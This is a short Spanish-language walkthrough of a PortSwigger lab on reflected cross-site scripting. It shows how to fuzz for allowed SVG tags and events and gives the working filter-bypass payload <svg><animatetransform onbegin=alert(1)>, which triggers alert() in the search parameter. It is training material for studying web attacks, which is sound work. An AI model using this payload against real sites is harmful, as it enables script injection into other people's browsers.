# 5 - SVG markup allowed

> This lab has a simple [reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerability. The site is blocking common tags but misses some SVG tags and events.
>
>  To solve the lab, perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that calls the `alert()` function.



![](../../../.gitbook/assets/imagen%20%28678%29.png)

Luego vemos tags validas 

![](../../../.gitbook/assets/imagen%20%28676%29.png)

Luego editamos nuestro ataque:

```text
GET /?search=<svg><animatetransform%20§§=1> HTTP/1.1
```

Como permite svg permite rendirazar lo que esta dentro, en ese renderizado ejecuta etiquetas \(como animate que esta permitida\). Ahora con eso veremos que podemos incluir dentro, nos fijamos que eventos soportaa.

![](../../../.gitbook/assets/imagen%20%28675%29.png)



```text
<svg><animatetransform onbegin=alert(1)>
```

Buscamos eso y listo.

